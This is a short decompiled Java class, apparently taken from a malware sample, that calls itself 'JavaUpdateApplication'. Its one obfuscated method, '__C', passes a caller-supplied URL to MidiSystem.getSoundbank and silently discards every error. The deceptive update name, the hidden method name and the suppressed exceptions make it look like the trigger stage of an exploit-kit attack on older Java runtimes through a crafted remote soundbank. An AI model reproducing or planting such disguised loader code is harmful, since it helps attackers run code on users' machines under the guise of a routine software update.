import javax.sound.midi.MidiSystem;
import java.net.URL;

// 
// Decompiled by Procyon v0.5.30
// 

public class JavaUpdateApplication
{
    public static void __C(final URL url) {
        try {
            MidiSystem.getSoundbank(url);
        }
        catch (Exception ex) {}
    }
}
